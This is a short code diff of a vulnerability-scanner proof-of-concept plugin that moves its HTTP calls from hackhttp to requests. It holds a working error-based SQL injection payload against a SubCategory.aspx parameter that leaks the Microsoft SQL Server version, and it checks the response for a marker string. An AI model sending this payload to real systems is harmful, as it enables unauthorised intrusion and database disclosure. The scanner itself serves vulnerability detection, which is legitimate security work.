@@ -33,14 +33,13 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             
-            hh = hackhttp.hackhttp()
             arg = self.target
             payload = '/SubCategory.aspx?keywords=2&minSalePrice=&maxSalePrice=&categoryId=1\
                 &TagIds=convert%28int%2C%28char%2871%29%252Bchar%2865%29%252Bchar%2879%29%252Bchar%2832%29%252Bchar%2874%29%252Bchar\
                 %2873%29%252Bchar%2864%29%252B@@version%29%29&brand=27'
             target = arg + payload
-            code, head,res, errcode, _ = hh.http(target)
-            if code!=0 and 'GAO JI@Microsoft SQL Server' in res: 
+            req = requests.get(target)
+            if req.status_code!=0 and 'GAO JI@Microsoft SQL Server' in req.text: 
                 #security_hole(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
